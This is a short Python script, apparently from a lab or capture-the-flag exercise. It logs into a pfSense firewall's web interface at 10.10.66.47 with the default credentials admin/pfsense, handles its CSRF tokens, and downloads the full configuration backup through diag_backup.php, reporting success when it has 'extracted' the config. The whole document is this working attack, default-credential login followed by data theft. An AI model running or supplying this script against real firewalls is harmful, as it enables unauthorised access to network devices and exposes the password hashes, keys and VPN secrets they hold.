import requests, re, urllib3
urllib3.disable_warnings()

s = requests.Session()
s.verify = False

base = 'https://10.10.66.47'
r1 = s.get(base + '/')
m = re.search(r'var\s+csrfMagicToken\s*=\s*"([^"]+)"', r1.text)
csrf = m.group(1) if m else ''

data = {'__csrf_magic': csrf, 'usernamefld': 'admin', 'passwordfld': 'pfsense', 'login': 'Sign In'}
s.post(base + '/index.php', data=data)

# Download config.xml from diag_backup.php
r_bk = s.get(base + '/diag_backup.php')
m2 = re.search(r'var\s+csrfMagicToken\s*=\s*"([^"]+)"', r_bk.text)
csrf2 = m2.group(1) if m2 else ''

post_bk = {
    '__csrf_magic': csrf2,
    'backuparea': '',
    'nopackages': 'no',
    'download': 'Download configuration as XML'
}
r_dl = s.post(base + '/diag_backup.php', data=post_bk)
print('Downloaded length:', len(r_dl.text))
if '<pfsense>' in r_dl.text:
    with open('pfsense_real_config.xml', 'w', encoding='utf-8') as f:
        f.write(r_dl.text)
    print('SUCCESSFULLY EXTRACTED REAL pfSense CONFIG.XML!')
else:
    print('Failed to extract config.xml, status:', r_dl.status_code)
    with open('dl_fail.html', 'w', encoding='utf-8') as f:
        f.write(r_dl.text)
